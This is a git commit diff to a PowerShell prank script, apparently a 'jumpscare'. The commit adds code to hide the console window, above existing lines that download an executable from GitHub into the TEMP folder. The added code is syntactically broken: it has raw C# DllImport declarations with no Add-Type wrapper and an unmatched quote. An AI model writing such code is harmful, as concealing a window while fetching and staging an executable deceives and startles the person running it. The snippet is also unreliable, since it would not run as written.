21c949914c4912359dee078b83c420ba662eda01
LordRyan1999 <62319844+LordRyan1999@users.noreply.github.com>
2021-07-02 19:38:31 -0700

    Update JumpscareThing.ps1

--- JumpscareThing.ps1
+++ JumpscareThing.ps1
@@ -1,3 +1,17 @@
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+
 $url = "https://github.com/LordRyan1999/JumpscareThing/raw/main/JumpscareThing.exe"
 $outpath = "$env:TEMP/JumpscareThing.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
